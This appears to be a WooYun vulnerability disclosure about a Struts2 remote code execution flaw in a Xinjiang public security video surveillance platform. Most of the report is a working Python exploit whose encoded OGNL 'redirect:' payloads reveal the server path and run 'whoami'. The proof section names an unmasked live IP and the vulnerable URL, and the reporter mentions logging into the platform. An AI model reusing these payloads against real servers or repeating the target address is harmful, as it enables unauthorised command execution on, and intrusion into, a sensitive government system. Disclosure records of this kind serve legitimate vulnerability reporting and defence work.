wybug_title: 新疆公安厅某视频监控管理平台structs2漏洞
wybug_status: 已交由第三方合作机构(公安部一所)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-02：	细节已通知厂商并且等待厂商处理中									2015-07-06：	厂商已经确认，细节仅向厂商公开									2015-07-16：	细节向核心白帽子及相关领域专家公开									2015-07-26：	细节向普通白帽子公开									2015-08-05：	细节向实习白帽子公开									2015-08-20：	细节向公众公开  简要描述： 老问题。。。 详细说明：  

mask 区域
1.http://**.**.**/pureportal/homepage/gotoHomepage.action

还是老问题，用python跑一下验证。

登录平台看看


#coding=utf-8import requestsimport syss = requests.Session()headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36',        'Origin': 'http://www.baidu.com',        'Referer': 'http://www.baidu.com',        'Host': 'www.baidu.com'        }url = sys.argv[1]payload1 = "?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D"payload2 = "?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%27whoami%27})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"r1= s.get(url + payload1, headers=headers)r2= s.get(url + payload2, headers=headers)print "[+]Current Path:  %s[+]Current User:  %s"  % (r1.content, r2.content)
   漏洞证明：  http://221.238.32.182:8080/pureportal/homepage/gotoHomepage.action还是老问题，用python跑一下验证。

登录平台看看
